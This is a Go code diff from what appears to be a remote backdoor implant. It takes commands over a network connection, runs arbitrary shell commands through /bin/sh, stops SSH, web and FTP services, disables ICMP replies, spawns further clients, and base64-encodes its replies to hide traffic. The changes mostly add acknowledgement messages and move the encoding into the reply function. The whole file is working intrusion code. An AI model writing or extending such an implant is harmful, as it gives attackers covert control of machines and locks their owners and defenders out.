@@ -101,9 +101,10 @@ func EstablishConnection(port string) {
 							} else if CheckService("ssh") {
 								Execute(FormatCommand("systemctl stop ssh"))
 							} else {
-								respond("Error: ssh service not found", conn)
+								respond("Error: ssh service not found\n", conn)
 							}
 						}
+						respond("SSH disabled.\n", conn)
 					case "http":
 						switch brks[1] {
 						default:
@@ -117,6 +118,7 @@ func EstablishConnection(port string) {
 								Execute(FormatCommand("systemctl stop nginx"))
 							}
 						}
+						respond("HTTP disabled.\n", conn)
 					case "ftp":
 						switch brks[1] {
 						default:
@@ -124,11 +126,13 @@ func EstablishConnection(port string) {
 								Execute(FormatCommand("systemctl stop vsftpd"))
 							}
 						}
+						respond("FTP disabled.\n", conn)
 
 					case "icmp":
 						Execute(FormatCommand("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all"))
+						respond("ICMP Disabled.\n", conn)
 					default:
-						respond("Error: Break not supported by client", conn)
+						respond("Error: Break not supported by client\n", conn)
 					}
 				}
 			}
@@ -137,11 +141,12 @@ func EstablishConnection(port string) {
 			breaks = breaks[strings.Index(breaks, "CMD:{")+5 : strings.Index(breaks, "}")]
 			breakList := strings.Split(breaks, ",")
 			// TODO: continue here
-			respond("Commands not yet implemented", conn)
+			//respond("Commands not yet implemented", conn)
 			for _, brk := range breakList {
 				switch brk {
 				case "arp":
-				case "spawn-unencoded":
+				case "child":
+					respond("Spawned unencoded client\n", conn)
 					go unencodedClient()
 				}
 			}
@@ -152,7 +157,7 @@ func EstablishConnection(port string) {
 				cmd = exec.Command("/bin/sh", "-c", FormatCommand(command))
 			}
 			out, _ := cmd.CombinedOutput()
-			respond((b64_encode(string(out)) + "\n"), conn)
+			respond(string(out), conn)
 			cmd.Run()
 		}
 
@@ -194,5 +199,6 @@ func Execute(command string) string {
 }
 
 func respond(str string, conn net.Conn) {
+	str = b64_encode(str) + "\n"
 	conn.Write([]byte(str))
 }
